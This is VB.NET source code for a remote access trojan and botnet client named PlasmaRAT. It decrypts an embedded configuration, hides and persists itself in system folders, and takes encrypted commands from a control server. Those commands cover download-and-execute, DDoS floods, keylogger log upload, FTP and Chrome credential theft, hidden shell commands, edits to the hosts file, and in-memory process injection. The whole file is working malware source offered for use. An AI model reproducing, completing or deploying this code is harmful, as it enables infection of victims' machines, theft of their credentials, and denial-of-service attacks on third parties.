'Created: KFC WATERMELON 2013
'Modificated: Mogyiii 2019
'DELETED: BOTKILLER, AVKILLER,
Imports System.Threading
Imports System.IO
Imports System.Net.Sockets
Imports System.Net
Imports Microsoft.Win32
Imports System.Text.RegularExpressions
Imports System.Text
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Management

Public Module PlasmaRAT


    'Start Global Vars
    Public RunBotKiller As Boolean = False
    Public AutoBotKill As Boolean = False
    Public Muted As Boolean = False
    Public OneBotOnly As New Mutex
    Public IRC As TcpClient
    Public Write As StreamWriter
    Public Read As StreamReader
    Private Delegate Sub MessageReceived(ByVal msg As String)
    Private Event MSG As MessageReceived

    'Public Antis As New Thread(New ThreadStart(AddressOf AntiEverything.RunAntis)) 'Anti Sandbox

    Public IRCThread As New Thread(New ThreadStart(AddressOf connect))

    Public LoggerThread As New Thread(New ThreadStart(AddressOf StartLogger))
    Public InstallationOfEverything As String
    Public keepalive As Boolean = False
    Public readlines As Boolean = False
    Public InstalledSuccessfully As Boolean = False
    'End Global Vars

    Public Settings() As String

    'CUSTOMER INFO GOES BELOW
    Public Server As String = "DESTORID//WASTELAND//2.0"  'Server/DNS
    Public BackupDNS As String
    Public BackupServer As String = String.Empty
    Public port As Integer               'Port
    Public Username As String = "\\\\\\\\\\\\\\" '.NET Seal Username
    Public Password As String = "IUWEEQWIOER$89^*(&@^$*&#@$HAFKJHDAKJSFHjd89379327AJHFD*&#($hajklshdf##*$&^(AAA"
    'Bot Info Goes Below                  'Mutex
    Public RunFileAs As String = "EI#&*(R&USOKFDJLKDSJLFKJOWI"               'Run File As
    Public InstallFolder As String = "xkjeio*(&#(*&$(*#@&$(*&#@(*&(!&(*#&kjhdfalkjsfdsaF"
    Public WhatToRun As String = String.Empty
    ''' ''''''''''User Auth'''''''''''''''''''''''
    Sub main()
        Try
            Dim x = DecryptConfig(My.Resources.A1)
            Dim lol = x.Trim
            Settings = lol.Split("*")
            Server = Settings(1)
            port = Convert.ToInt32(Settings(2))
            Username = Settings(3)
            RunFileAs = Settings(4)
            InstallFolder = Settings(5)
            WhatToRun = Settings(6)
            BackupDNS = Settings(7)
        Catch
            Threading.Thread.Sleep(System.Threading.Timeout.Infinite)
        End Try
        Try
            If Application.ExecutablePath.Contains("HardwareCheck.exe") Then
                Disablers.Disable()
                Dim r As New Random
                My.Computer.FileSystem.MoveFile(Application.ExecutablePath, IO.Path.GetTempPath & r.Next(1000, 9000).ToString)
                End
            End If
        Catch : End Try
        Try
            If IsAdmin() Then
                If Not WhatToRun.Contains("z") Then AntisDetected = True
                InstallationOfEverything = Environment.GetFolderPath(Environment.SpecialFolder.System) & "\" & InstallFolder & "\"
            Else
                InstallationOfEverything = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\" & InstallFolder & "\"
            End If
        Catch
            InstallationOfEverything = Environment.GetEnvironmentVariable("PROGRAMDATA") & "\" & InstallFolder & "\"
        End Try

        InstallBot()
        Try
            OneBotOnly = New Mutex(False, "4919245")
            If OneBotOnly.WaitOne(0, False) = False Then
                OneBotOnly.Close()
                OneBotOnly = Nothing
                Threading.Thread.Sleep(100)
                If InstalledSuccessfully = True Then
                    Try : Dim r As New Random
                        My.Computer.FileSystem.MoveFile(Application.ExecutablePath, IO.Path.GetTempPath & r.Next(1000, 9000).ToString)
                    Catch : End Try
                End If
                End
            End If
        Catch : End Try
        startbot()
    End Sub
    Public Sub startbot()
        On Error Resume Next
        IRCThread.Start()
        LoggerThread.Start()
        If WhatToRun.Contains("q") Then ProcessAccessRights.ProtectCurrentProcess()

        Dim Startup = New System.Timers.Timer(5000)
        AddHandler Startup.Elapsed, AddressOf Persistence.Startup

        'AntiEverything.RunAntis() 'Anti Sandbox
        If WhatToRun.Contains("z") Then
            If WhatToRun.Contains("s") Then Startup.Start()
            If WhatToRun.Contains("c") Then CriticalProcess()
            If WhatToRun.Contains("bk") Then Call SaveSetting("Microsoft", "Sysinternals", "BK", "active")
        End If

        Disablers.Disable()
    End Sub
    Sub InstallBot()
        Try
            Dim dir As New IO.DirectoryInfo(InstallationOfEverything)
            If Not dir.Exists Then
                dir.Create()
                Try : dir.Attributes = FileAttributes.Hidden + FileAttributes.NotContentIndexed + FileAttributes.System : Catch : End Try
            End If
            If Not AntisDetected Then
                Dim InstallPath = InstallationOfEverything & RunFileAs
                If Not Application.ExecutablePath.Contains(RunFileAs) Then
                    If Not My.Computer.FileSystem.FileExists(InstallPath) Then
                        Try
                            DeleteFile(Application.ExecutablePath & ":Zone.Identifier")
                        Catch : End Try
                        My.Computer.FileSystem.CopyFile(Application.ExecutablePath, InstallPath)
                        Process.Start(InstallPath)
                        Try : Dim fileSettings As New FileInfo(InstallPath)
                            fileSettings.Attributes = FileAttributes.Hidden + FileAttributes.NotContentIndexed + FileAttributes.ReadOnly + FileAttributes.System : Catch : End Try
                        Try : Dim MyPath As New FileInfo(Application.ExecutablePath)
                            MyPath.Attributes = FileAttributes.Hidden + FileAttributes.NotContentIndexed + FileAttributes.ReadOnly + FileAttributes.System : Catch : End Try
                        InstalledSuccessfully = True
                        Threading.Thread.Sleep(30000)
                    Else
                        AllowAccess(InstallationOfEverything)
                        AllowAccess(InstallPath)
                        Dim fileSettings As New FileInfo(InstallPath)
                        fileSettings.Attributes = FileAttributes.Normal
                        Threading.Thread.Sleep(500)
                        My.Computer.FileSystem.DeleteFile(InstallPath)
                        System.IO.File.Copy(Application.ExecutablePath, InstallPath)
                        Process.Start(InstallPath)
                        InstalledSuccessfully = True
                        Threading.Thread.Sleep(30000)
                    End If
                End If
            End If
        Catch : End Try
    End Sub
    Public Sub connect() 'Start Connect
        Try
            IRC = New TcpClient(Server, port)

            Send(String.Format("BOT*" & BotName()))

            If keepalive = False Then
                keepalive = True
                Dim ping As New Thread(AddressOf SendPing)
                ping.Start()
            End If
            If readlines = False Then
                readlines = True
                AddHandler MSG, AddressOf Parsecommands
            End If

            IRC.GetStream().BeginRead(New Byte() {0}, 0, 0, New AsyncCallback(AddressOf Connection_read), Nothing)
        Catch
            Try
                If WhatToRun.Contains("y") Then
                    If Server = Settings(1) Then
                        Server = BackupDNS
                    Else
                        Server = Settings(1)
                    End If
                End If
                IRC.Close()
            Catch ex As Exception
            End Try
            Thread.Sleep(10000)
            connect()
        End Try
    End Sub
    Public Sub SendPing() 'Connect reserve
        While True
            Try
                Send("l")
            Catch : End Try
            Thread.Sleep(60000)
        End While
    End Sub
    Public Sub Connection_read(ByVal ar As IAsyncResult)
        Try
            Read = New StreamReader(IRC.GetStream())
            RaiseEvent MSG((AES_Decrypt(Read.ReadLine())))
            IRC.GetStream().BeginRead(New Byte() {0}, 0, 0, New AsyncCallback(AddressOf Connection_read), Nothing)
        Catch 'Connection reset
            Threading.Thread.Sleep(1000)
            Try
                IRC.Close()
            Catch : End Try
            connect()
        End Try
    End Sub

    Public Sub Parsecommands(ByVal Input As String) 'Commands
        Try
            Dim DataSplitted() As String = Split(Input, " ")
            Select Case DataSplitted(0)
                Case "RECONNECT"
                    IRC.Close()
                Case "seed"
                    SeedTorrent(DataSplitted(1))
                Case ("miner.start")
                    'InstallMiner(DataSplitted(1), DataSplitted(2), DataSplitted(3), DataSplitted(4))
                Case ("miner.gpu.stop")

                Case ("keylogger.send")
                    SendLogs()
                Case ("keylogger.delete")
                    DeleteLogs()
                Case ("keylogger.search")
                    Dim asdf() As String = Split(Input, """")
                    SearchLogs(asdf(1))
                Case ("download")
                    Dim newlocation As String = IO.Path.GetTempPath & DataSplitted(2)
                    If Not IO.File.Exists(newlocation) Then
                        Dim download As New WebClient
                        download.DownloadFile(DataSplitted(1), newlocation)
                        Process.Start(newlocation)
                        TalktoChannel("Download and Execute Successful. Location: " & newlocation, String.Empty)
                    Else
                        TalktoChannel("File name " & DataSplitted(2) & " already used. Ignoring Execute File", String.Empty)
                    End If
                Case ("visit")
                    If DataSplitted(1) = "-h" Then 'Ezt átkell alakitani
                        Dim Browser As New ProcessStartInfo
                        Browser.FileName = "iexplore.exe"
                        Browser.Arguments = DataSplitted(2)
                        Browser.WindowStyle = ProcessWindowStyle.Hidden
                        System.Diagnostics.Process.Start(Browser)
                        TalktoChannel("Visited Site Hidden: ", DataSplitted(2))
                    Else
                        Process.Start(DataSplitted(1))
                        TalktoChannel("Visited Site: ", DataSplitted(1))
                    End If
                Case ("ddos.slowloris.start")
                    StartSlowloris(DataSplitted(1), DataSplitted(3), DataSplitted(2), "")
                Case ("ddos.arme.start")
                    StartARME(DataSplitted(1), DataSplitted(3), DataSplitted(2), "")
                Case ("ddos.posthttp.start")
                    Dim asdf() As String = Split(Input, """")
                    StartPOSTHTTP(DataSplitted(1), DataSplitted(3), DataSplitted(2), asdf(1))
                Case ("ddos.httpget.start")
                    StartHTTPGet(DataSplitted(1), DataSplitted(3), DataSplitted(2))
                Case ("ddos.bwflood.start")
                    StartBandwidthFlood(DataSplitted(1), DataSplitted(3), DataSplitted(2))
                Case ("ddos.udp.start")
                    StartUDP(DataSplitted(1), DataSplitted(4), DataSplitted(3), DataSplitted(2))
                Case ("ddos.condis.start")
                    StartCondis(DataSplitted(1), DataSplitted(4), DataSplitted(3), DataSplitted(2))
                Case ("hosts")
                    Try
                        Dim asdf() As String = Split(Input, """")
                        IO.File.AppendAllText("C:\windows\system32\drivers\etc\hosts", vbNewLine & asdf(1))
                        TalktoChannel("Added to HOSTS.", "")
                    Catch
                        TalktoChannel("Unable to add to HOSTS.", "")
                    End Try
                Case (".avdetails")
                    Dim output As String = GetAntiVirus() & ". " & GetFirewall()
                    TalktoChannel(output, "")
                Case ("ftp")
                    FTPSteal.ftpsteal()
                Case ("chrome")
                    GetChrome()
                Case ("info")
                    TalktoChannel("Running At: " & Application.ExecutablePath & ".", String.Empty)
                Case ("pcspecs")
                    TalktoChannel("CPU: " & GetCPU() & ". GPU: " & GetVideoCard() & " RAM: " & Format((My.Computer.Info.TotalPhysicalMemory / 1024) / 1024 / 1024, "###,###,##0 GB"), String.Empty)
                Case ("shell")
                    Dim asdf() As String = Split(Input, """")
                    Shell((asdf(1)), AppWinStyle.Hide)
                    TalktoChannel("Shell Command Executed.", "")
            End Select

            If Input.Contains("mute") Then
                If DataSplitted(1) = ("on") Then
                    Muted = True
                End If
                If DataSplitted(1) = ("off") Then
                    Muted = False
                End If
            End If
            If Input.Contains("inject") Then
                Dim r As New System.Net.WebClient()
                Dim File = r.DownloadData(DataSplitted(1))
                If Input.Contains("reflect") Then
                    ReflectBytes(File)
                    TalktoChannel("File reflected into Self Successfully", String.Empty)
                End If
                If Input.Contains("runpe") Then
                    mRunpe.InjectPE(File, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory & "vbc.exe", String.Empty)
                    TalktoChannel("File Injected into vbc.exe Successfully", String.Empty)
                End If
            End If
            If Input.Contains(".stop") Then
                If Input.Contains("udp") Then
                    StopUDP()
                End If
                If Input.Contains("arme") Then
                    StopARME()
                End If
                If Input.Contains("slowloris") Then
                    StopSlowloris()
                End If
                If Input.Contains("httpget") Then
                    StopHTTPGET()
                End If
                If Input.Contains("bwflood") Then
                    StopBandwidthFlood()
                End If
                If Input.Contains("posthttp") Then
                    StopPOSTHTTP()
                End If
                If Input.Contains("condis") Then
                    StopCondis()
                End If
            End If
        Catch Error_Msg As Exception
            TalktoChannel("Error: " & Error_Msg.ToString, String.Empty)
        End Try
    End Sub
    Public Sub Send(ByVal MSG As String) 'Send Encrypted MSG
        Try
            Write = New StreamWriter(IRC.GetStream())
            Write.WriteLine(AES_Encrypt(MSG))
            Write.Flush()
        Catch ex As Exception
        End Try
    End Sub
    Public Sub TalktoChannel(ByVal blue As String, ByVal red As String) 'Channel
        Try
            If Muted = False Then
                Dim Username = Environment.UserName.ToString
                Send("LOGS*" & Username & "*" & blue & red & "*")
                ' Send((Convert.ToString("PRIVMSG ") & Channel) + " " & ChrW(3) & "12" & blue & ChrW(3) & "10" & red)
            End If
        Catch
        End Try
    End Sub

    Public Function DecryptConfig(ByVal input As String) As String 'Decrypt
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(Password))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = System.Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function
    Sub ReflectBytes(ByVal data As Byte())
        Dim T As New Thread(AddressOf Run) 'Work around for "SetCompatibleTextRenderingDefault"
        T.SetApartmentState(ApartmentState.STA) 'Set STA to support drag/drop and dialogs?
        T.Start(data)
    End Sub
    Sub Run(ByVal o As Object)
        Dim T As MethodInfo = Assembly.Load(DirectCast(o, Byte())).EntryPoint
        T.Invoke(Nothing, If(T.GetParameters.Length = 1, {New String() {}}, Nothing)) 'Invoke logic for Console or Form
    End Sub


    Class Getcn 'I don't know what is this 
        <DllImport("kernel32.dll")>
        Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
        End Function

        Private Const LOCALE_SYSTEM_DEFAULT As UInteger = &H400
        Private Const LOCALE_SABBREVCTRYNAME As UInteger = &H7


        Private Shared Function GetInfo(ByVal lInfo As UInteger) As String
            Try
                Dim lpLCData = New System.Text.StringBuilder(256)
                Dim ret As Integer = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, lInfo, lpLCData, lpLCData.Capacity)

                If ret > 0 Then
                    Return lpLCData.ToString().Substring(0, ret - 1)
                End If
                Return "Error"
            Catch : End Try
            Return "Error"
        End Function
        Public Shared Function g() As String
            Return (GetInfo(LOCALE_SABBREVCTRYNAME))
        End Function
    End Class
    <DllImport("kernel32", CharSet:=CharSet.Unicode, SetLastError:=True)> _
    Public Function DeleteFile(ByVal name As String) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
End Module